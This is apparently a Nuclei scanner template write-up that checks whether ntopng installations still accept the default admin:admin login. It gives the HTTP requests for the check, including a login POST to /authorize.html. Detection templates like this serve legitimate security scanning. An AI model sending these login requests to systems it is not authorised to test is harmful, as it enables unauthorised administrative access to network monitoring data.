# Nuclei Template: ntopng - Default Login
**Template ID:** ntopng-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`ntopng-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected the ntopng network traffic monitoring tool was found to be using default credentials (admin:admin). An attacker could have gained full administrative access to network traffic data, flow analysis, and system configuration.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /authorize.html HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user={{username}}&password={{password}}&referer=%2F

GET / HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.ntop.org/guides/ntopng/faq.html
- https://www.ntop.org/guides/ntopng/api/rest/api_v2.html
